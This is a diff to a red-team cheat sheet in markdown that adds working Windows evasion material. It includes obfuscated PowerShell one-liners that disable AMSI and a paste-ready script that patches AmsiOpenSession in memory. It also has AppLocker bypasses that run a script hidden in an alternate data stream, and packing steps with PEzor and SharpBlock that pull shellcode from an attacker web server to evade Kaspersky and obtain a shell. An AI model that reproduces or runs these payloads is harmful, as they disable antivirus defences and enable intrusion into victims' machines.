@@ -23,11 +23,83 @@
 
 ### AMSI Bypass
 
+one line
+
 ```sh
 sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+
+set-item('V'+'aR'+'IA'+'blE:1q2'+'uZx')([TYpE]("{1}{0}"-F'F','rE'));(GeT-VariaBle("1Q2U"+"zX")-VaL)."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}"-f'Util','A','Amsi','.Management.','utomation.','s','System'))."g`etf`iElD"(("{0}{2}{1}"-f'amsi','d','InitFaile'),("{2}{4}{0}{1}{3}"-f'Stat','i','NonPubli','c','c,'))."sE`T`VaLUE"(${n`ULl},${t`RuE})
+
+$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
 ```
 
-### Full PoC (Auto)
+script (can be copied pasted directly into powershell console)
+
+```bash
+function LookupFunc {
+  Param ($moduleName, $functionName)
+
+  $assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
+  Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
+    Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
+  $tmp=@()
+  $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
+  return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null,  @($moduleName)), $functionName))
+}
+
+function getDelegateType {
+  Param (
+    [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func, [Parameter(Position = 1)] [Type] $delType = [Void]
+  )
+  $type = [AppDomain]::CurrentDomain.
+    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
+    DefineDynamicModule('InMemoryModule', $false).
+    DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
+  $type.
+    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
+      SetImplementationFlags('Runtime, Managed')
+  $type.
+    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
+      SetImplementationFlags('Runtime, Managed')
+
+    return $type.CreateType()
+}
+[IntPtr]$funcAddr = LookupFunc amsi.dll AmsiOpenSession
+$oldProtectionBuffer = 0
+$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualProtect), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))
+$vp.Invoke($funcAddr, 3, 0x40, [ref]$oldProtectionBuffer)
+
+$buf = [Byte[]] (0x48, 0x31, 0xC0)
+[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $funcAddr, 3)
+$vp.Invoke($funcAddr, 3, 0x20, [ref]$oldProtectionBuffer)
+```
+
+## Applocker whitelist bypass
+
+- LOLBAS
+- Copy binary to trusted folders
+- dll acceschk c:/windows
+
+```bash
+type js.js > "C:\<target_file>.log:js.js"
+dir /r "<target_file>.log
+wscript  "C:\<target_file>.log:js.js"
+```
+
+- Alternate Data Stream
+
+```bash
+type js.js > "C:\<target_file>.log:js.js"
+dir /r "<target_file>.log
+wscript  "C:\<target_file>.log:js.js"
+```
+
+- Third part execution
+
+Using Python, Perl, etc.
+
+
+### Full PoC against Kasp
 
 Winning combo : SharpBlock + PEzor (bypass Kasp for the moment..)
 
@@ -39,29 +111,17 @@ Winning combo : SharpBlock + PEzor (bypass Kasp for the moment..)
   ```
 3. Repack shellcode
   ```sh
-  ./PEzor.sh -unhook -antidebug -text -sgn -sleep=150 <SHELLCODE_NAME>.bin
+  ./PEzor.sh -unhook -rx -sleep=150 <SHELLCODE_NAME>.bin
   ```
 4. Repack SharpBlock adding arguments
   - HTTP webserver version :
   ```sh
-  ./PEzor.sh -unhook -antidebug -text -rx -sleep=150 <SharpBlock.exe> -p '-e http://<IP_WEBSERVER>/<SHELLCODE_NAME>.bin.packed.exe -s "c:\program files\internet explorer\iexplore.exe"'
+  ./PEzor.sh -unhook -antidebug -text -rx -sleep=150 <SharpBlock.exe> -p '-e http://<IP_WEBSERVER>/<SHELLCODE_NAME>.bin.packed.exe -s "C:\Windows\System32\SecurityHealthSystray.exe"'
   ```
-  - Local version :
-  ```sh
-  ./PEzor.sh -unhook -antidebug -text -rx -sleep=150 SharpBlock.exe -p '-e <SHELLCODE_NAME>.bin.packed.exe -s "c:\program files\internet explorer\iexplore.exe"'
-  ```
+
 5. Setup your launcher (and webserver), and execute the packed binary file from the target
 
-6. Be patient (around 5min depending on the sleep argument set), get your shell and enjoy
-
-> SharpBlock can load a shellcode from a webserver, or locally. To get rid of the webserver, you can directly drop the two binaries to the target (packed SharpBlock and packed shellcode) but do not execute the packed shellcode directly or you might get caught by the AV. You only need to execute the packed SharpBlock binary (which will inject the packed shellcode directly into memory).
-
----
-
-
-### Full PoC (Manual)
-
-**Todo** 
+6. Be patient (around 5min depending on the sleep argument set), get your shell and enjoy :)
 
 ---
 
